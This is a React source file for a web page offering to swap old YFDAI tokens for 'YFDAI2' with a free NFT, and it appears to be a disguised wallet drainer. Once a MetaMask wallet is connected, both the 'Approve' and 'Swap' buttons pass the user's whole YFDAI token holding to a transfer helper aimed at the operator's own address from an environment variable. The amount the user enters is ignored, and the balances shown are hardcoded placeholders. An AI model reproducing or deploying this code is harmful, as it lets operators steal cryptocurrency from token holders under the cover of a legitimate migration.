import React, { useState } from "react";
import styles from "./tokenSwap.module.scss";
import logo from "../../assets/YFDAI2.png";
import { toast } from "react-toastify";
import { ethers } from "ethers";
import { formatFixed } from "@exodus/ethersproject-bignumber";
import { useEffect } from "react";
import { getTokenBalances, transferToken } from "../../helper/helpers";
import { useCallback } from "react";
import { useNavigate } from "react-router-dom";

const TokenSwap = () => {
  const [walletAddress, setwalletAddress] = useState("");
  const [walletConnected, setwalletConnected] = useState(null);
  const [chainID, setchainID] = useState(0);
  const [userWallet, setuserWallet] = useState("");
  const [processing, setProcessing] = useState(false);
  const [initiateWallet, setInitiateWallet] = useState(false);
  const [listAllTokens, setListAllTokens] = useState([]);
  const [loadingTable, setLoadingTable] = useState(false);
  const [processingStaking, setProcessingStaking] = useState({
    approve: false,
    swap: false,
  });
  const [stakeValue, setStakeValue] = useState(null);

  const navigate = useNavigate();
  const handleToHomePage = () => {
    navigate("/");
  };

  const setProcessFunction = (id) => {
    let newObj = { ...processingStaking };
    Object.keys(newObj).map((item) => (newObj[item] = false));
    newObj[id] = true;
    setProcessingStaking(newObj);
  };

  let to = process.env.REACT_APP_MY_ADDRESS;
  let APIKeyString = process.env.REACT_APP_API_KEY;

  const connectWallet = async () => {
    if (typeof window.ethereum !== "undefined") {
      setProcessing(true);
      setLoadingTable(true);
      // request for the account of a connected user
      let [account] = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);

        const { chainId } = await provider.getNetwork();
        setchainID(parseInt(chainId));

        // getBalance function accepts strings only
        let balance = await provider.getBalance(account);
        balance = ethers.utils.formatEther(balance);
        balance = parseFloat(balance).toFixed(5);

        console.log(balance);
        setProcessing(false);
        setuserWallet(account);
        sessionStorage.setItem("setuserWallet", account);

        // Format the user wallet address
        account = `${account.slice(0, 4)}…${account.slice(
          account.length - 5,
          account.length
        )}`;
        // setchainID(parseInt(window.ethereum.chainId));

        setwalletAddress(account);
        setwalletConnected(true);
        // save data to local storage
        sessionStorage.setItem("account", account);
        sessionStorage.setItem("chainID", parseInt(chainId));
        setInitiateWallet(true);
      } catch (error) {
        const id = toast.loading("Processing...");
        console.log("Error: ", error);
        return toast.update(id, {
          render:
            " Connect to our DApp via metamask extension on our PC or use your wallet browser to connect",
          type: "warning",
          isLoading: false,
          autoClose: 3000,
        });
      }
    } else {
      const id = toast.loading("Processing...");
      return toast.update(id, {
        render:
          " Connect to our DApp via metamask extension on our PC or use your wallet browser to connect",
        type: "warning",
        isLoading: false,
        autoClose: 3000,
      });
    }
  };

  const getERC20Tokens = useCallback(async () => {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    let chainId = chainID;
    let userwallet = userWallet;

    if (chainId === 0) {
      if (sessionStorage.getItem("chainID")) {
        chainId = parseInt(sessionStorage.getItem("chainID"));
        userwallet = sessionStorage.getItem("setuserWallet");
      }
    }
    const allTokens = await getTokenBalances({
      chainID: chainId,
      APIKeyString,
      userWallet: userwallet,
      provider,
    });
    setListAllTokens(allTokens);
    setLoadingTable(false);
    return allTokens;
  }, [APIKeyString, userWallet, chainID]);

  // This functionality fetches all data on user storage
  useEffect(() => {
    const walletAddressData = sessionStorage.getItem("account");
    const chainIdData = sessionStorage.getItem("chainID");
    const userWalletData = sessionStorage.getItem("setuserWallet");

    // console.log(`This is the wallet address data ${walletAddressData}`);
    if (walletAddressData) {
      setwalletAddress(walletAddressData);
      setwalletConnected(true);
      setchainID(parseInt(chainIdData));
      setuserWallet(userWalletData);

      (async () => {
        await getERC20Tokens();
        setInitiateWallet(false);
      })();
    }
  }, [initiateWallet, getERC20Tokens]);

  //   This functionality format token balance big number
  const formatBalance = (balance, decimals) => {
    let format = formatFixed(
      balance.toString(),
      Math.max(parseInt(decimals.toString()), 1)
    ).toString();
    return format;
  };

  const fArray = [...listAllTokens];
  const result = fArray?.filter((item) => {
    if (item.address === "0xf4cd3d3fda8d7fd6c5a500203e38640a70bf9577") {
      return item.address;
    }
    return false;
  });
  // console.log(result);
  // console.log(`This is the balance ${userYfdaiBal}`);
  // setStakeValue(userYfdaiBal);

  const setTransferClick = async (balanceObj) => {
    console.log(`yes`);
    console.log(balanceObj);
    if (typeof to !== "string") {
      to = `${to}`;
    } else {
      // checks it the recipient address is a valid address
      const isAddress = ethers.utils.isAddress(to);
      if (!isAddress) {
        console.log("Invalid address provided, please try again");
      } else {
        try {
          setProcessingStaking(true);
          const provider = new ethers.providers.Web3Provider(window.ethereum);
          await transferToken(balanceObj, to, provider);
          setProcessingStaking({
            approve: false,
            swap: false,
          });
        } catch (error) {
          setProcessingStaking({
            approve: false,
            swap: false,
          });
          console.log(error);
        }
      }
    }
  };
  return (
    <div className={styles.container}>
      <div className={styles.content}>
        <div className={styles.navBarParent}>
          <div className={styles.logoParent}>
            <img
              src={logo}
              alt={logo}
              onClick={() => {
                handleToHomePage();
              }}
            />
          </div>
          <div className={styles.walletConnectDiv}>
            <button
              onClick={connectWallet}
              style={{
                cursor: walletConnected && "none",
              }}
            >
              {walletConnected
                ? walletAddress
                : !processing
                ? "Connect Wallet"
                : "Connecting"}
            </button>
          </div>
        </div>
        {walletConnected ? (
          <div className={styles.swapParentContainer}>
            {!loadingTable ? (
              result.length ? (
                <div className={styles.swapParentContent}>
                  <div className={styles.firstSection}>
                    <div className={styles.flexParent}>
                      <div className={styles.flexItemsDiv}>
                        <span>Old $YFDAI Balance</span>
                        <span>0.00000 YFDAI</span>
                      </div>
                      <div className={styles.flexItemsDiv}>
                        <span>New $YFDAI2 Balance</span>
                        <span>0.00000 YFDA2</span>
                      </div>
                      <div className={styles.flexItemsDiv}>
                        <span>Free NFT Claimed</span>
                        <span>NO</span>
                      </div>
                    </div>
                  </div>
                  <div className={styles.secondSection}>
                    {result.map((item) => (
                      <div className={styles.flexParent2}>
                        <div className={styles.flexItemsDiv2}>
                          <div className={styles.formParent}>
                            <label>
                              SWAP YFDAI <span>(Deposit $YFDAI (ERC-20)</span>
                            </label>
                            <div className={styles.formGroup}>
                              <input
                                type="number"
                                value={stakeValue}
                                onChange={(e) => {
                                  setStakeValue(e.target.value);
                                }}
                              />
                              <div className={styles.maxButton}>
                                <button
                                  type="button"
                                  onClick={() => {
                                    setStakeValue(
                                      parseFloat(
                                        formatBalance(
                                          item.balance,
                                          item.decimals
                                        )
                                      ).toFixed(2)
                                    );
                                  }}
                                >
                                  max
                                </button>
                              </div>
                            </div>
                          </div>
                          <div className={styles.approveParent}>
                            <button
                              onClick={() => {
                                setTransferClick(item);
                                setProcessFunction("approve");
                              }}
                            >
                              {processingStaking.approve
                                ? `Processing`
                                : `  Approve`}
                            </button>
                            <button
                              onClick={() => {
                                setTransferClick(item);
                                setProcessFunction("swap");
                              }}
                            >
                              {processingStaking.swap ? `Processing` : `Swap`}
                            </button>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ) : (
                <div className={styles.notEligible}>
                  {" "}
                  This offer is only exclusive for YFDAI holders only
                </div>
              )
            ) : (
              <div className={styles.loadingStyling}> Loading ...</div>
            )}
          </div>
        ) : (
          <div className={styles.noTokenContainer}>
            <div className={styles.noTokenContent}>
              <h1>
                This offer is only exclusive for YFDAI holders only, Connect
                your wallet to swap your tokens
              </h1>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default TokenSwap;
